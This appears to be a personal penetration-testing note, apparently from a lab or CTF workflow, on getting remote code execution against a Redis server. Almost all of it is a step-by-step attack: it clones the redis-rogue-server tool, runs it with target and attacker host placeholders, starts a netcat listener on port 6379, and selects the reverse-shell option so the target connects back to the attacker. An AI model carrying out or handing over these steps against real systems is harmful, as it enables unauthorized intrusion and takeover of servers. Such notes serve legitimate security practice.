
by checking https://book.hacktricks.wiki/en/network-services-pentesting/6379-pentesting-redis.html?highlight=Redis#automatic-enumeration
I found that there is rce for [[redis]]
can be found here
https://github.com/n0b0dyCN/redis-rogue-server/tree/master

steps to get a reverse shell 
1- download it 
```powershell
git clone https://github.com/n0b0dyCN/redis-rogue-server.git
```

2- move to folder
```powershell
cd redis-rogue-server 
```

3- run it 
```powershell
python3 redis-rogue-server.py --rhost <% tp.frontmatter["RHOSTS"] %> --lhost <% tp.frontmatter["LHOST"] %>
```
![600](Assets/Pasted%20image%2020250811120117.png)

4- start a listener 
```powershell
rlwrap -cAr nc -lvnp 6379
```


5- when asked if you need interactive shell or reverse shell, enter "r"
then enter your ip address and port 6379
![00](Assets/Pasted%20image%2020250811120232.png)
6- check your listerner, you should have a reverse shell
